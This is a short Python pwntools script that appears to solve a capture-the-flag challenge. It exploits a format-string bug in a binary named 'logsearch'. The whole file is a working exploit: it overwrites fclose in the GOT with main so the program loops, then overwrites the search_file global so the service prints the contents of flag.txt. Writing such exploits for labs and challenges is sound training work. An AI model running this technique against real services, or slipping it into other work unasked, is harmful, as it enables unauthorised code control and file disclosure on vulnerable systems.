#!/usr/bin/env python3
# python3 port of the original format-string solve.
# printf(search_phrase) is an uncontrolled format string on a non-PIE binary.
#  1) overwrite fclose@GOT -> main so the program loops for more input
#     (the original handle_connection is now main after the stdio conversion)
#  2) overwrite the global search_file "logs.txt" -> "flag.txt"
#  3) search for "sun" to print the flag line out of flag.txt
import sys, os
from pwn import ELF, remote, context, fmtstr_payload, u32
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18002))
exe=ELF(".build/logsearch" if os.path.exists(".build/logsearch") else "logsearch"); context.binary=exe; context.log_level='error'
OFF=91
io=remote(HOST,PORT)
def send(p):
    io.recvuntil(b"Enter a search phrase: "); io.sendline(p)
send(fmtstr_payload(OFF, {exe.got["fclose"]: exe.symbols["main"]}, write_size="short"))
send(fmtstr_payload(OFF, {exe.symbols["search_file"]: u32(b"flag")}, write_size="short"))
io.recvuntil(b"Enter a search phrase: "); io.sendline(b"sun")
print(io.recvall(timeout=4).decode(errors='replace'))
